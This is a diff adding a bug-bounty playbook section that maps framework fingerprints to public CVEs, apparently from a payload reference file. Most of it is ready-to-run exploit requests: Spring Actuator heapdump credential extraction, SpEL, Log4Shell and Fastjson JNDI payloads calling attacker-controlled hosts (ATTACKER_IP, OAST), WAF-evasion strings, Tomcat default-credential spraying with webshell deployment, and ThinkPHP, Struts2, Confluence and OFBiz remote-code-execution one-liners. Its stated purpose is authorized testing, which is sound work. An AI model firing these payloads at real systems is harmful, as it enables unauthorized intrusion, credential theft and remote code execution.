@@ -1364,3 +1364,288 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 /v1
 /v2
 ```
+
+---
+
+---
+
+## FRAMEWORK 1-DAY QUICK-WINS
+
+Enterprise frameworks ship known-CVE footguns. Recon fingerprints the stack — this section bridges fingerprint -> exact detection request -> exploit payload -> severity so a stack match becomes a fast Critical/High instead of a note.
+
+> **Why these pay:** a precise version fingerprint maps to a public CVE, and the PoC is a single request. This is the highest signal-per-minute work in the file — when `httpx`/`nuclei` flag Spring Boot, Tomcat, Confluence, ThinkPHP, etc., come straight here.
+
+> **Before you claim impact:** confirm the running version is actually in the vulnerable range AND land the working PoC (extracted secret, reflected command output, deployed shell). A version banner alone is on the always-rejected list — "looks vulnerable" is N/A. Fingerprint via `Server`/`X-Application-Context` headers, error pages, `/META-INF/MANIFEST.MF`, `*.js.map`, or a `/package.json`/`/composer.json`/`/pom.xml` leak (see Error Disclosure / Debug Endpoints class).
+
+### Quick Routing Table
+
+| Fingerprint signal | Jump to | Best case |
+|---|---|---|
+| `X-Application-Context`, `/actuator`, Whitelabel error page | Spring Boot Actuator | Critical (heapdump secrets / env RCE) |
+| Spring app + reflected expression sink | Spring SpEL | Critical (RCE) |
+| Spring Cloud Gateway + `/actuator/gateway` | Spring Cloud Gateway | Critical (RCE) |
+| Any Java app logging user input (UA, headers) | Log4Shell | Critical (RCE) |
+| Java API echoing JSON, `@type` accepted | Fastjson / Jackson AutoType | Critical (RCE) |
+| `Set-Cookie: PHPSESSID` + `?s=` routing, `think\` in errors | ThinkPHP | Critical (RCE) |
+| Werkzeug traceback / `/console`, `Server: Werkzeug` | Flask / Werkzeug | Critical (RCE) |
+| `Server: Apache-Coyote`, `/manager/html`, `JSESSIONID` | Tomcat Manager | Critical (RCE) |
+| `.action`/`.do` URLs, `Struts` in stack trace | Struts2 OGNL | Critical (RCE) |
+| `/control/main`, `OFBiz` in title/headers | Apache OFBiz | Critical (RCE) |
+| `X-Confluence-Request-Time`, `/wiki`, Atlassian footer | Confluence OGNL | Critical (RCE) |
+
+---
+
+### Spring Boot Actuator (`/actuator/env`, `/heapdump`, `/gateway`)
+
+**Fingerprint:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` returns a JSON link index.
+
+```bash
+# Detection — enumerate exposed actuators (try both old and new base paths)
+for p in env health info heapdump mappings configprops gateway threaddump beans; do
+  for base in /actuator /; do
+    curl -s -o /dev/null -w "%{http_code} ${base}${p}\n" "https://target.com${base}${p}"
+  done
+done
+# 200 on /actuator/env or /actuator/heapdump = lead
+```
+
+**Exploit — heapdump secret extraction (Critical, no auth needed):**
+```bash
+# Download the JVM heap snapshot, then grep live secrets out of it
+curl -s "https://target.com/actuator/heapdump" -o heap.hprof   # often 50-500MB
+strings heap.hprof | grep -iE 'password|secret|aws_|api[_-]?key|jdbc:|authorization|bearer ' | sort -u
+# Heap routinely contains: DB creds, AWS access/secret keys, internal service URLs,
+# Basic-Auth blobs, session tokens. Each extracted live credential = its own finding.
+```
+
+**Exploit — `/env` write -> RCE (Critical, when POST is allowed on older Boot 1.x/2.x):**
+```bash
+# 1. Point a property at an attacker-controlled XML/YAML to trigger remote bean load
+curl -s "https://target.com/actuator/env" -X POST -H "Content-Type: application/json" \
+  -d '{"name":"spring.cloud.bootstrap.location","value":"http://ATTACKER/x.yml"}'
+# 2. /actuator/refresh re-reads it -> deserialization / SpEL -> RCE (eureka-client gadget classic)
+curl -s "https://target.com/actuator/refresh" -X POST
+```
+
+> **Submittable:** an extracted live credential, or proven RCE. **N/A:** `/actuator/health` exposed alone, or `/env` with all values masked as `******`.
+
+---
+
+### Spring SpEL Injection
+
+**Fingerprint:** Spring app reflecting a parameter into an expression sink (route conditions, `@Value`, query builders, error templates).
+
+```bash
+# Detection — math eval differential. ${...} and #{...} are DIFFERENT engines, do not conflate them.
+curl -s "https://target.com/path?x=%23%7B7*7%7D"        # #{7*7} -> 49 = TRUE SpEL (the RCE-capable sink)
+curl -s "https://target.com/path?x=%24%7B7*7%7D"        # ${7*7} -> 49 = property-placeholder reflection ONLY (not full SpEL)
+```
+
+> **⚠️ `${...}` is a trap.** `${7*7}->49` is usually Spring's property-placeholder / error-page reflection, which does **not** evaluate the `T(...)` operator — `${T(java.lang.Runtime)...}` silently fails. Only a **true SpEL sink** (`#{...}`, or `SpelExpressionParser.parseExpression()` on your input) runs the RCE payloads below. Confirm with `#{7*7}` before burning the 5-minute window on `T()` payloads.
+
+**Exploit (Critical, RCE) — needs a true SpEL `#{...}` / parseExpression sink:**
+```java
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})}
+#{T(org.springframework.cglib.core.ReflectUtils).defineClass(...)}            // bypass when Runtime blocked
+// DNS-confirm RCE when no output reflection:
+#{T(java.net.InetAddress).getByName('OUTPUT.attacker.oast.site')}
+```
+
+> **Submittable:** reflected `id`/`whoami` output or an OAST DNS hit you control via a `#{}`/SpEL sink. **N/A:** `49` reflection alone (especially `${}`-only) with no working `T()` execution — that is just expression reflection, keep digging to a real SpEL sink + RCE.
+
+---
+
+### Spring Cloud Gateway — SpEL Code Injection (CVE-2022-22947)
+
+**Fingerprint:** Spring Cloud Gateway 3.0.0–3.0.6 / 3.1.0 with the `gateway` actuator exposed.
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/actuator/gateway/routes"   # 200 = exposed
+```
+
+**Exploit (Critical, unauthenticated RCE):**
+```bash
+# 1. Add a route whose filter contains a SpEL payload
+curl -s -X POST "https://target.com/actuator/gateway/routes/poc" \
+  -H "Content-Type: application/json" -d '{
+  "id":"poc","filters":[{"name":"AddResponseHeader","args":{
+    "name":"Result",
+    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+  }}],"uri":"http://example.com"}'
+# 2. Refresh to evaluate the SpEL, 3. hit the route to read output in the Result header, 4. delete route
+curl -s -X POST "https://target.com/actuator/gateway/refresh"
+curl -si "https://target.com/actuator/gateway/routes/poc" | grep -i Result
+curl -s -X DELETE "https://target.com/actuator/gateway/routes/poc"
+```
+
+---
+
+### Log4Shell — Log4j JNDI (CVE-2021-44228)
+
+**Fingerprint:** any Java app that logs user input — User-Agent, `X-Api-Version`, `Referer`, username fields, search boxes. No version banner needed; spray the marker and watch for a callback.
+
+```bash
+# Detection — OAST DNS/LDAP callback. Use interactsh-client / Burp Collaborator for OAST.
+PAYLOAD='${jndi:ldap://${hostName}.OAST_ID.oast.site/a}'   # ${hostName} tags which host fired
+curl -s "https://target.com/" \
+  -H "User-Agent: $PAYLOAD" -H "X-Api-Version: $PAYLOAD" -H "Referer: $PAYLOAD"
+# WAF-evasion variants if the literal is filtered:
+# ${${::-j}ndi:${::-l}${::-d}${::-a}${::-p}://x.oast.site/a}
+# ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://x.oast.site/a}
+# ${jndi:dns://x.oast.site/a}   (DNS-only — proves reachability even if LDAP egress is blocked)
+```
+
+> **Submittable:** an OAST hit you control proving server-side JNDI lookup (the `${hostName}`/`${env:...}` exfil variant strengthens it by leaking real data). DNS-only callback = Medium; full LDAP-gadget RCE = Critical. **N/A:** no callback (target patched or not logging that sink).
+
+---
+
+### Fastjson / Jackson AutoType (JNDI Deserialization)
+
+**Fingerprint:** Java API that parses a JSON request body and reflects/echoes it; sending an extra `@type` key changes behavior or errors with `autoType is not support`.
+
+```bash
+# Detection — DNS probe via JdbcRowSetImpl (works <= 1.2.80 patterns; SafeMode off)
+curl -s "https://target.com/api/x" -H "Content-Type: application/json" -d '{
+  "@type":"com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName":"ldap://OAST_ID.oast.site/a",
+  "autoCommit":true
+}'
+# OAST DNS hit = AutoType reachable. Jackson equivalent abuses polymorphic @class / enableDefaultTyping.
+```
+
+**Exploit (Critical, RCE):** stand up a malicious JNDI server, then point `dataSourceName` at it.
+```bash
+# JNDI-Exploit-Kit / rogue-jndi serves an LDAP/RMI ref that returns an RCE gadget
+java -jar JNDIExploit.jar -i ATTACKER_IP
+# dataSourceName -> ldap://ATTACKER_IP:1389/Basic/Command/base64/<payload>
+```
+> **Note:** post-JDK-8u191, attacker JNDI must use a local-classpath gadget (BeanFactory/ELProcessor) instead of remote codebase. **Submittable:** OAST hit + landed gadget (reflected command output / shell). **N/A:** `autoType is not support` returned = blocked, move on.
+
+---
+
+### ThinkPHP 5.x RCE (`invokefunction`)
+
+**Fingerprint:** PHP app, `?s=` routing in URLs, `think\` namespace in errors, `Set-Cookie: PHPSESSID`. Affected: 5.0.5–5.0.22 and 5.1.x before 5.1.31.
+
+```bash
+# Detection + RCE in one shot (5.0.x) — reflected command output = confirmed
+curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | grep -i 'php version'
+
+# RCE — run a command (5.0.x)
+curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+
+# 5.1.x variant (no index.php prefix needed; abuses filter/Request)
+curl -s "https://target.com/?s=index/\think\Request/input&filter[]=system&data=id"
+curl -s "https://target.com/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+```
+
+> **Submittable:** reflected `id`/`phpinfo()` output. **N/A:** 404/200 with no command echo (patched or non-vuln minor).
+
+---
+
+### Flask / Werkzeug Debug Console (PIN Regeneration)
+
+**Fingerprint:** `Server: Werkzeug/...` header, an interactive traceback page on error, or `/console` returning a PIN prompt — means `debug=True` shipped to prod.
+
+```bash
+# Detection — does the debug console exist?
+curl -s "https://target.com/console" | grep -i 'pin\|werkzeug\|interactive'
+# Trigger a traceback to confirm debug mode (any 500-inducing input)
+```
+
+**Exploit (Critical, RCE) — regenerate the PIN when you also have an LFI / path traversal:**
+The PIN is deterministic from local files. With an LFI primitive (see Path Traversal payloads) read the six inputs, then reproduce the PIN offline:
+```bash
+# Leak the PIN ingredients via LFI:
+#   username       -> /etc/passwd (the user running the app, e.g. www-data)
+#   modname        -> usually 'flask.app'
+#   appname        -> usually 'Flask'
+#   app file path  -> .../site-packages/flask/app.py   (from the traceback)
+#   MAC (decimal)  -> /sys/class/net/eth0/address  -> int(mac.replace(':',''),16)
+#   machine-id     -> /etc/machine-id  (+ /proc/self/cgroup docker id if containerized)
+# Feed all six into the public Werkzeug PIN algorithm, submit at /console -> Python REPL:
+#   __import__('os').popen('id').read()
+```
+
+> **Submittable:** code execution in the console (proves debug-prod + PIN broken). Even debug=True alone with the interactive traceback is a reportable info-leak (source + local vars + env). **N/A:** generic 500 page with no interactive traceback.
+
+---
+
+### Tomcat Manager — Weak Creds + WAR Deploy / PUT Write
+
+**Fingerprint:** `Server: Apache-Coyote/1.1`, `JSESSIONID` cookie, `/manager/html` prompts Basic-Auth.
+
+```bash
+# Detection — default/weak manager creds (try the classic shortlist, throttle to respect rate limits)
+for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:tomcat manager:manager tomcat:admin; do
+  curl -s -o /dev/null -w "$cred -> %{http_code}\n" -u "$cred" "https://target.com/manager/text/list"
+done   # 200 = authenticated to Manager
+```
+
+**Exploit A (Critical, RCE) — deploy a JSP webshell WAR:**
+```bash
+# Build a minimal WAR with a cmd JSP, then deploy via the text API
+curl -s -u USER:PASS -T shell.war "https://target.com/manager/text/deploy?path=/poc&update=true"
+curl -s "https://target.com/poc/shell.jsp?cmd=id"
+```
+
+**Exploit B (Critical, RCE) — PUT JSP write, CVE-2017-12615 (Windows, `readonly=false`):**
+```bash
+curl -s -X PUT "https://target.com/poc.jsp/" --data-binary @shell.jsp   # trailing slash bypasses block
+curl -s "https://target.com/poc.jsp?cmd=id"
+```
+
+> **Submittable:** authenticated Manager access (already High — it is admin of the app server) escalated to deployed-shell command output. **N/A:** Manager page reachable but every credential returns 401/403.
+
+---
+
+### Struts2 OGNL (S2-045 / S2-046, CVE-2017-5638)
+
+**Fingerprint:** `.action` / `.do` URLs, `Struts` in stack traces, OGNL artifacts. S2-045 lives in the Jakarta multipart parser via a malicious `Content-Type`.
+
+```bash
+# Detection + RCE (S2-045) — command output reflected in a custom header
+curl -s -D - "https://target.com/index.action" \
+  -H "Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ct.setMemberAccess(#dm)).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+```
+
+> **Submittable:** reflected command output in the response/header. **N/A:** no output (likely patched — Struts2 OGNL is heavily virtual-patched by WAFs; a 403 here is often the WAF, not the fix).
+
+---
+
+### Apache OFBiz — Unauthenticated RCE (CVE-2023-49070 / CVE-2024-45195)
+
+**Fingerprint:** `/control/main`, `OFBiz` in the title/headers, `/webtools/control/...` paths. Affected: < 18.12.10 (XML-RPC chain) and < 18.12.16 (view-auth bypass chain).
+
+```bash
+# Detection — is the auth-bypass view reachable? (override params force an unauthenticated screen render)
+curl -sk "https://target.com/webtools/control/ViewBlogArticle?USERNAME=&PASSWORD=&requirePasswordChange=Y" -o /dev/null -w "%{http_code}\n"
+# CVE-2023-49070: legacy XML-RPC endpoint still mounted
+curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/webtools/control/xmlrpc"
+```
+
+**Exploit (Critical, unauthenticated RCE):** the auth bypass (`requirePasswordChange=Y` / empty-creds override) reaches a screen that renders a Groovy program; chain to `ProgramExport`/XML-RPC deserialization to run a command. Use the public PoCs (jakabakos/Apache-OFBiz-Authentication-Bypass) to drive the request set, then confirm with an OAST callback or reflected output.
+
+> **Submittable:** proven command execution via the bypass chain. **N/A:** login page reachable but the override params still demand auth (patched ≥ 18.12.16).
+
+---
+
+### Confluence / Atlassian OGNL (CVE-2022-26134)
+
+**Fingerprint:** `X-Confluence-Request-Time` header, `/wiki` base, Atlassian footer. Pre-auth OGNL injection — the URL namespace is evaluated as OGNL.
+
+```bash
+# Detection + RCE — command output returned in the X-Cmd-Response header (one request)
+curl -sk -D - -o /dev/null "https://target.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
+# Decoded namespace: ${(#a=@org.apache.commons.io.IOUtils@toString(
+#   @java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).
+#   (@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
+# A populated X-Cmd-Response header in the reply = confirmed unauthenticated RCE.
+```
+
+> **Submittable:** `X-Cmd-Response` containing real command output. Affected: all supported versions before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1. **N/A:** header absent (patched). Note many Confluence instances are vendor-hosted — check scope and asset ownership before firing.
+
+---
+
+> **Chain note:** these often escalate — Spring heapdump -> AWS keys -> see SSRF class / cloud-metadata pivot; Tomcat/Confluence/OFBiz shell -> internal network -> SSRF and IDOR on adjacent services. Pull the secret or land the shell first, then map what it unlocks before writing the report.
